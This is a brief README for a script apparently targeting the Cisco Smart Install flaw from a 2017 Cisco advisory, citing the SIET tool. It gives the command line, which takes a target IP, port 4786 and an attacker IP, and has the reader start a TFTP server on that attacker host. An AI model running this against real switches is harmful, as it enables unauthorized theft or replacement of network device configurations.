# cisco_smart_install

Source: https://github.com/Sab0tag3d/SIET

Reference: https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20170214-smi

## How to use

python cisco_smart_install_test.py <target_ip> <target_port> <attacker_ip>

Example: python cisco_smart_install_test.py 192.168.1.2 4786 192.168.1.3

## Start an TFTP server

sudo /etc/init.d/atftpd start

TFTP root directory:

/srv/tftp/
